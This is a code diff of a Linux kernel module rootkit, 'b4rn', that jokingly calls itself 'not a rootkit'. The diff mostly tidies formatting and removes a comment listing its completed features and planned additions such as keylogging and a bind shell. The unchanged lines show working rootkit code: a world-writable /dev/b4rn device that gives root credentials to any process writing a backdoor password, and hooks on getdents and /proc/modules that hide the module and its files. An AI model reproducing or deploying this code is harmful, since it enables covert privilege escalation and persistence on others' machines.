@@ -15,24 +15,6 @@
 #include <asm/special_insns.h>
 #include <asm/tlbflush.h>
 
-/* 
- * [DONE] Hook an existing proc/dev file to give us 
- *   a backdoor (give current user root) 
- * [DONE] Hide that /dev file (getdent)
- * [DONE] Hide us from /proc/modules (and thus lsmod)
- * [DONE] Hide lib from file system (getdent)
- * [DONE] Hide .ko file from filesystem (getdent) 
- * [DONE] Hide libtest from /proc/<PID>/maps
- *
- * Other things we could do here:
- *   - informational prints
- *   - interactive (only do attacks when we receive a command on char dev)
- *   - keylogging
- *   - hide specific processes (from ps output, /proc/<PID>)
- *   - hide network sockets (e.g. a bind shell)
- *   - trigger further code injection
- */
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("s00butai");
 MODULE_DESCRIPTION("This is not a rootkit.");
@@ -72,6 +54,7 @@ struct linux_dirent64 {
 	char               d_name[];
  };
 
+
 static int old_uid;
 static int old_gid;
 static int old_euid;
@@ -92,11 +75,11 @@ barn_write (struct file * file, const char * buf, size_t count, loff_t * ppos)
 	if (strncmp(kbuf, BACKDOOR_PASSWORD, sizeof(BACKDOOR_PASSWORD)-1) == 0) {
 		new = prepare_creds();
 		if (new != NULL) {
-			old_uid = new->uid.val;
-			old_gid = new->gid.val;
-			old_euid = new->euid.val;
-			old_egid = new->egid.val;
-			new->uid.val = new->gid.val = 0;
+			old_uid       = new->uid.val;
+			old_gid       = new->gid.val;
+			old_euid      = new->euid.val;
+			old_egid      = new->egid.val;
+			new->uid.val  = new->gid.val = 0;
 			new->euid.val = new->egid.val = 0;
 		}
 		commit_creds(new);
@@ -116,7 +99,7 @@ barn_read (struct file * file, char * buf, size_t count, loff_t *ppos)
 // boilerplate for /dev files
 static const struct file_operations barnops = {
 	.owner = THIS_MODULE,
-	.read = barn_read,
+	.read  = barn_read,
 	.write = barn_write
 };
 
@@ -124,25 +107,27 @@ static const struct file_operations barnops = {
 // will appear on /dev/b4rn as a r/w misc char device. 
 // The mode sets the perms to be 0666
 static struct miscdevice barn_dev = {
-	.minor = MISC_DYNAMIC_MINOR, 
-	.name = "b4rn", 
-	.fops = &barnops,
-	.mode = S_IFCHR | S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH,
+	.minor = MISC_DYNAMIC_MINOR,
+	.name  = "b4rn",
+	.fops  = &barnops,
+	.mode  = S_IFCHR | S_IRUSR |  // char ; 0666
+             S_IWUSR | S_IRGRP | 
+             S_IWGRP | S_IROTH | 
+             S_IWOTH,
 };
 
 // function type for the getdents handler function
 typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 // the original handler
-sys_getdents_t sys_getdents_orig = NULL;
+static sys_getdents_t sys_getdents_orig = NULL;
 
 typedef asmlinkage long (*sys_getdents64_t)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
 // the original handler
-sys_getdents64_t sys_getdents64_orig = NULL;
-
+static sys_getdents64_t sys_getdents64_orig = NULL;
 
 typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
 // the original read handler
-proc_modules_read_t proc_modules_read_orig = NULL;
+static proc_modules_read_t proc_modules_read_orig = NULL;
 
 
 static inline void
@@ -207,7 +192,6 @@ proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *off
 }
 
 
-// TODO: fix this up
 static asmlinkage long 
 sys_getdents_new (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) 
 {
